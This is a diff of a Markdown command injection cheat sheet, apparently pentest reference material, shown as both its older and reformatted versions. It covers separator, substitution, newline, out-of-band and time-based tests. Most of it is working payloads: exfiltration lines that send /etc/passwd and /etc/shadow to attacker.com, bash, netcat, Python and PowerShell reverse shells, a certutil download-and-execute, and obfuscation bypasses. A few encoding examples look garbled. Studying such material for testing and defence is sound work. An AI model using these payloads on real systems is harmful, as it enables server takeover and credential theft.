@@ -1,294 +1,585 @@
-Command Injection is a web security vulnerability that allows an attacker to execute arbitrary system commands on the host operating system. This vulnerability occurs when an application passes unsafe user supplied data to a system shell.
+# **📌 What is Command Injection?**
 
-How It Works
-Command injection occurs when an application executes system commands that include user-supplied data without proper sanitization. For example, in the code:
+**Command Injection** is a critical web vulnerability where an attacker executes **system-level commands** on the server by injecting malicious input into applications that call OS commands.
 
+It occurs when applications pass **unsanitized user input** to:
+
+* Shell commands
+* System binaries
+* Command wrappers
+* OS interpreters
+
+---
+
+# **📌 Example Vulnerable Code (PHP)**
+
+```php
 <?php
 $cmd = 'ping -c 4 ' . $_GET['host'];
 system($cmd);
 ?>
+```
 
-An attacker might input: 8.8.8.8; ls -la, changing the command to:
+Attacker enters:
 
+```
+8.8.8.8; ls -la
+```
+
+Executed command becomes:
+
+```
 ping -c 4 8.8.8.8; ls -la
+```
 
-This executes both the ping command and lists directory contents.
+---
 
-Detection
-Manual Testing
-Command Separator Tests
-Used to chain multiple commands together. Tests if the application properly sanitizes command separators:
+# **📌 Detection Methodology (Manual + Automated)**
 
-# Semicolon (;) - Command sequencing
-command1;command2        # Executes commands sequentially
-ping 127.0.0.1;id       # Executes ping, then id
-echo test;whoami        # Outputs test, then username
+---
 
-# Ampersand (&) - Background processing
-command1&command2       # Executes both commands in background
-ping 127.0.0.1&dir     # Starts ping and immediately runs dir
-whoami&hostname        # Runs both commands simultaneously
+# **1️⃣ Command Separator Injection Tests**
 
-# Double Ampersand (&&) - Conditional execution
-command1&&command2      # Executes command2 only if command1 succeeds
-ping 127.0.0.1&&whoami # Runs whoami only if ping succeeds
-cd /tmp&&ls -la        # Lists directory only if cd succeeds
+### **Semicolon (;)**
 
-# Pipe (|) - Output redirection
-command1|command2      # Sends output of command1 to command2
-whoami|tr a-z A-Z     # Converts username to uppercase
-ls -la|grep root      # Lists files and filters for 'root'
+```
+ping 127.0.0.1;id
+echo test;whoami
+```
 
-Command Substitution Tests
-Tests if the application allows command output to be used as input:
+### **Ampersand (&)**
 
-# Backtick (`) substitution
-`command`             # Classic command substitution
-echo `whoami`        # Outputs result of whoami
-ping `hostname`      # Pings the result of hostname
+```
+ping 127.0.0.1&id
+whoami&hostname
+```
 
-# Dollar substitution
-$(command)           # Modern command substitution
-echo $(id)          # Outputs result of id
-cat $(locate passwd) # Reads files found by locate
+### **Double Ampersand (&&)**
 
-# Nested substitution
-$(echo `whoami`)    # Nested classic in modern
-`echo $(hostname)`  # Nested modern in classic
+```
+ping 127.0.0.1&&whoami
+cd /tmp&&ls -la
+```
 
-Newline Injection Tests
-Tests if the application properly handles line breaks in commands:
+### **Pipe (|)**
 
-# URL encoded newlines
-command1%0acommand2  # %0a represents \n
-ping%0aid           # Executes ping, then id on new line
-whoami%0als         # Runs whoami, then ls
+```
+whoami|tr a-z A-Z
+ls -la|grep root
+```
 
-# Carriage return injection
-command1%0dcommand2  # %0d represents \r
-echo test%0dcat /etc/passwd  # Potentially bypasses filters
+---
 
-OS Detection Tests
-Identifies target operating system using specific commands:
+# **2️⃣ Command Substitution Tests**
 
-# Windows specific commands
-ver                  # Shows Windows version
-systeminfo          # Detailed system information
-type C:\Windows\System32\drivers\etc\hosts  # Reads hosts file
-net user            # Lists users
-dir C:\             # Lists root directory
+### **Backticks**
 
-# Linux specific commands
-uname -a            # Kernel and system information
-cat /etc/issue      # Distribution information
-cat /proc/version   # Kernel version information
-lsb_release -a      # Distribution details
-cat /etc/passwd     # User account information
+```
+`whoami`
+`id`
+```
 
-Out-of-Band Tests
-Tests command injection through external interaction detection:
+### **Dollar Substitution**
 
-# DNS based detection
-nslookup uniquestring.attackerdomain.com  # Generates DNS lookup
-ping uniquestring.attackerdomain.com      # ICMP based detection
-dig uniquestring.attackerdomain.com       # DNS query tool
+```
+$(whoami)
+$(id)
+cat $(locate passwd)
+```
 
-# HTTP based detection
-wget http://attacker.com/uniquestring     # Generates HTTP GET
-curl http://attacker.com/uniquestring     # Alternative HTTP request
-powershell IEX(New-Object Net.WebClient).downloadString('http://attacker.com') # PowerShell web request
+### **Nested**
 
+```
+$(echo `whoami`)
+`echo $(hostname)`
+```
 
-Time-Based Tests
-Verifies command execution through time delays:
+---
 
-# Linux delay commands
-ping -c 10 127.0.0.1    # 10 second delay using ping
-sleep 10               # Direct delay command
-perl -e "sleep 10"     # Perl based delay
-python -c "import time; time.sleep(10)"  # Python delay
+# **3️⃣ Newline Injection Tests**
 
-# Windows delay commands
-ping -n 10 127.0.0.1   # Windows ping delay
-timeout 10             # Windows timeout command
-Start-Sleep -s 10      # PowerShell sleep
+### **URL Encoded Line Breaks**
 
-Automated Discovery
-Using Nuclei
-To learn how to use Nuclei in detail, you can go to our related tactic page by click here.
+```
+command1%0acommand2
+ping%0aid
+```
 
-# Run command injection templates
+### **Carriage Return**
+
+```
+command1%0dcommand2
+echo test%0dcat /etc/passwd
+```
+
+---
+
+# **4️⃣ OS Detection Commands**
+
+## **Windows**
+
+```
+ver
+systeminfo
+type C:\Windows\System32\drivers\etc\hosts
+net user
+dir C:\
+```
+
+## **Linux**
+
+```
+uname -a
+cat /etc/issue
+cat /proc/version
+lsb_release -a
+cat /etc/passwd
+```
+
+---
+
+# **5️⃣ Out-of-Band (OOB) Command Injection Tests**
+
+### **DNS**
+
+```
+nslookup uniq.attacker.com
+ping uniq.attacker.com
+dig uniq.attacker.com
+```
+
+### **HTTP**
+
+```
+wget http://attacker.com/abc
+curl http://attacker.com/abc
+```
+
+### **PowerShell**
+
+```
+powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker.com')
+```
+
+---
+
+# **6️⃣ Time-Based Command Injection**
+
+## **Linux**
+
+```
+sleep 10
+ping -c 10 127.0.0.1
+```
+
+## **Windows**
+
+```
+timeout 10
+ping -n 10 127.0.0.1
+Start-Sleep -s 10
+```
+
+---
+
+# **7️⃣ Automated Tools**
+
+### **Nuclei**
+
+```
 nuclei -u http://target.com -t cmd-injection/
+```
 
-# Run with custom templates
-nuclei -u http://target.com -t custom-cmd.yaml
+### **Commix**
 
-# Severity based scanning
-nuclei -u http://target.com -t cmd-injection/ -severity critical,high
+```
+commix --url="http://target.com/page?param=test"
+```
 
-Attack Vectors
-Direct Command Execution
-Basic command injection techniques that directly execute commands:
+### **Burp Suite**
 
-# Linux commands
+* Repeater
+* Intruder
+* Extensions: ActiveScan++
+
+---
+
+# **📌 ATTACK VECTORS**
+
+---
+
+# **8️⃣ Direct Command Execution**
+
+## **Linux**
+
+```
 ; cat /etc/passwd
 ; ls -la /
 ; id
 ; pwd
+```
 
-# Windows commands
-& dir C:\
+## **Windows**
+
+```
+& dir
 & type C:\Windows\System32\drivers\etc\hosts
 & whoami
-& net user
+```
 
-Command Substitution
-Using command substitution to execute commands and return output:
+---
 
-# Backtick syntax
+# **9️⃣ Command Substitution**
+
+### **Backtick**
+
+```
 `id`
 `whoami`
-`cat /etc/passwd`
+```
 
-# Dollar syntax
+### **Dollar**
+
+```
 $(id)
 $(whoami)
-$(cat /etc/passwd)
+```
 
-# Nested execution
-$(echo `whoami`)
+### **Nested**
+
+```
+$(echo `hostname`)
 `echo $(id)`
+```
 
-Data Exfiltration
-Methods to extract data from the system:
+---
 
-# File reading
-$(cat /etc/passwd > /dev/tcp/attacker.com/4444)
-; base64 /etc/shadow | curl -d @- http://attacker.com
+# **🔟 Data Exfiltration Techniques**
 
-# System enumeration
-; find / -perm -4000 2>/dev/null
-; netstat -an | nc attacker.com 4444
+### **File Exfil**
 
-Reverse Shell Payloads
-Basic Reverse Shells
-# Bash reverse shell
+```
+cat /etc/passwd > /dev/tcp/attacker.com/4444
+```
+
+### **Base64 + HTTP**
+
+```
+base64 /etc/shadow | curl -d @- http://attacker.com
+```
+
+### **Network Enumeration**
+
+```
+netstat -an | nc attacker.com 4444
+```
+
+---
+
+# **1️⃣1️⃣ Reverse Shell Payloads**
+
+## **Linux Reverse Shells**
+
+### **Bash**
+
+```
 bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+```
 
-# Netcat reverse shell
+### **Netcat**
+
+```
 nc -e /bin/sh 10.0.0.1 4444
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
+```
 
-# Python reverse shell
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+### **Netcat FIFO**
 
+```
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
+```
 
-Windows Reverse Shells
-# PowerShell reverse shell
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+### **Python**
 
-# Certutil download and execute
-certutil -urlcache -split -f http://10.0.0.1/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe
+```
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+```
 
+## **Windows Reverse Shells**
 
-Bypass Techniques
-Blacklist Bypass
-Used when specific commands or characters are blacklisted:
+### **PowerShell**
 
-# Command obfuscation
+```
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command <reverse-shell>
+```
+
+### **Certutil Download & Execute**
+
+```
+certutil -urlcache -split -f http://10.0.0.1/shell.exe C:\Temp\shell.exe && C:\Temp\shell.exe
+```
+
+---
+
+# **📌 BYPASS TECHNIQUES**
+
+---
+
+# **1️⃣2️⃣ Blacklist Bypasses**
+
+### **Command Obfuscation**
+
+```
 w'h'o'am'i
 w"h"o"am"i
 \w\h\o\a\m\i
+```
 
-# Alternative commands
-# Instead of: cat /etc/passwd
+### **Alternative Commands**
+
+Instead of:
+
+```
+cat /etc/passwd
+```
+
+Use:
+
+```
 head /etc/passwd
 tail /etc/passwd
 less /etc/passwd
 more /etc/passwd
+```
 
-# Character substitution
-$(rev<<<'imaohw')  # whoami reversed
-$(printf "whoami")
+### **Command Reversal**
 
-Space Bypass
-Used when spaces are filtered:
+```
+$(rev<<<'imaohw')   # reversed "whoami"
+```
 
-# IFS variable
+---
+
+# **1️⃣3️⃣ Space Bypasses**
+
+### **IFS**
+
+```
 cat${IFS}/etc/passwd
 cat$IFS/etc/passwd
-{cat,/etc/passwd}
+```
 
-# Line feed/Tabs
+### **Tabs / Newlines**
+
+```
 cat</etc/passwd
-cat$'\x20'/etc/passwd
+```
 
-# Brace expansion
+### **Brace Expansion**
+
+```
 {cat,/etc/passwd}
-X=$'cat\x20/etc/passwd'&&$X
+```
 
-Environment Variable Bypass
-Using environment variables to hide commands:
+### **Hex/Unicode whitespace**
 
-# Variable substitution
-COMMAND=whoami
-$COMMAND
+```
+cat$'\x20'/etc/passwd
+```
 
-# Base64 encoding
-echo "Y2F0IC9ldGMvcGFzc3dk"|base64 -d|bash
-export CMD="Y2F0IC9ldGMvcGFzc3dk";bash<<<$(base64 -d<<<$CMD)
+---
 
-# Hex encoding
-bash<<<$(xxd -r -p<<<776863616D69)  # whoami in hex
+# **1️⃣4️⃣ Environment Variable Abuse**
 
-Path Bypass
-Using different paths to execute commands:
+### **Variable replace**
 
-# Absolute paths
+```
+CMD=whoami
+$CMD
+```
+
+### **Base64 decode**
+
+```
+echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
+```
+
+### **Hex decode**
+
+```
+bash<<<$(xxd -r -p<<<77686f616d69)
+```
+
+---
+
+# **1️⃣5️⃣ PATH Bypasses**
+
+### **Absolute paths**
+
+```
 /usr/bin/whoami
 /bin/cat /etc/passwd
+```
 
-# Path variable manipulation
-PATH=/usr/bin;cat /etc/passwd
-PATH=$PATH:/usr/bin;whoami
+### **Custom PATH**
 
-# Binary locations
-which ls|xargs /bin/ls
-locate whoami|head -n1|xargs
+```
+PATH=/usr/bin:$PATH; whoami
+```
 
-Filter Evasion
-Advanced techniques to evade security filters:
+### **Binary enumeration**
 
-# Command concatenation
+```
+which ls | xargs /bin/ls
+```
+
+---
+
+# **1️⃣6️⃣ Filter Evasion Techniques**
+
+### **Single/Dual quotes**
+
+```
 'cat'</etc/passwd
 "w"h"o"a"m"i
+```
 
-# Wildcard usage
+### **Wildcards**
+
+```
 /???/??t /??c/p??s??
-/bin/c?t /etc/p?ssw?
+```
 
-# Using aliases
-alias ls=whoami;ls
+### **Aliases**
 
-# Double encoding
-$(echo -e "\x77\x68\x6f\x61\x6d\x69")  # whoami in hex
+```
+alias ls=whoami; ls
+```
 
-Character Encoding Bypass
-Different encoding methods to bypass filters:
+### **Double Encoding**
 
-# URL encoding
-curl$IFS-X$IFS'GET'$IFS"http://attacker.com"
+```
+$(echo -e "\x77\x68\x6f\x61\x6d\x69")
+```
 
-# Unicode encoding
-㎈㎉㎊㎋㎌㎍㎎  # Using Unicode lookalikes
+---
 
-# HTML encoding
-&#119;&#104;&#111;&#97;&#109;&#105;  # whoami in HTML entities
+# **1️⃣7️⃣ Character Encoding Bypasses**
 
-Common Tools
-Tool	Description	Primary Use Case
-Commix	Automated command injection tool	Discovery and exploitation
-Burp Suite	Web vulnerability scanner	Traffic interception and testing
-NetCat	Network utility	Reverse shell handling
-Metasploit	Exploitation framework	Advanced payload delivery
-PowerSploit	PowerShell post-exploitation	Windows command execution
+### **URL encoding**
+
+```
+whoami%0Acat%20/etc/passwd
+```
+
+### **HTML encoding**
+
+```
+&#119;&#104;&#111;&#97;&#109;&#105;  # whoami
+```
+
+### **Unicode lookalikes**
+
+Use homoglyphs to bypass filters:
+
+```
+㎗㎘㎙㎚㎛   # Unicode variants
+```
+
+---
+
+# **📌 ADVANCED COMMAND INJECTION TYPES**
+
+---
+
+# **1️⃣8️⃣ PHP Wrappers**
+
+```
+php://filter
+php://input
+data://
+expect://
+```
+
+### Example:
+
+```
+?cmd=system('id');
+```
+
+---
+
+# **1️⃣9️⃣ Node.js child_process Injection**
+
+```
+child_process.exec("ping " + user_input)
+```
+
+Payload:
+
+```
+127.0.0.1; whoami
+```
+
+---
+
+# **2️⃣0️⃣ Python Subprocess Injection**
+
+```
+subprocess.call("ping " + host, shell=True)
+```
+
+Attack:
+
+```
+8.8.8.8; id
+```
+
+---
+
+# **2️⃣1️⃣ Windows WMI Injection**
+
+```
+wmic process call create "cmd.exe /c whoami"
+```
+
+---
+
+# **📌 COMPLETE EXPLOITATION WORKFLOW**
+
+1️⃣ Detect reflection or blind indicator
+2️⃣ Try separators (`;`, `&&`, `|`)
+3️⃣ Try command substitution (`\`cmd``or`$(cmd)`)
+4️⃣ Try newline & encoding bypass
+5️⃣ Try OOB (DNS/HTTP callback)
+6️⃣ Identify OS
+7️⃣ Enumerate system
+8️⃣ Extract sensitive files
+9️⃣ Attempt reverse shell
+🔟 Privilege escalation
+
+---
+
+# **📌 POST-EXPLOITATION QUICK COMMANDS**
+
+### Linux
+
+```
+id
+whoami
+hostname
+uname -a
+netstat -ano
+find / -perm -4000
+```
+
+### Windows
+
+```
+whoami /priv
+systeminfo
+net user
+tasklist
+```
+
+---
+
